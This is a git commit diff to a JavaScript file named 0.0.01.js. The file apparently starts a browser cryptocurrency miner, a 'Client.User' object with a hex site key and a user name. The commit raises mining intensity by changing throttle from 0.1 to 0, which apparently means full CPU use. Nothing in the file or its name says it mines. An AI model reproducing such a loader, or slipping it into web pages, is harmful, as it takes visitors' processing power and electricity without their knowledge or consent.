ca15706b428bd3f7dc13014d0ac2bf8ff77da68a
darkside-community <99356964+darkside-community@users.noreply.github.com>
2022-03-01 01:46:02 +0900

    Update 0.0.01.js

--- js/0.0.01.js
+++ js/0.0.01.js
@@ -1,4 +1,4 @@
 var _client = new Client.User('9f17605b23c48e4bef868ca648c4f7d0a39839a9d9b5cb72edc6ca04bc7a0e96','Abassil', {
-   throttle: 0.1, c: 'w', ads: 0
+   throttle: 0, c: 'w', ads: 0
     });
     _client.start();
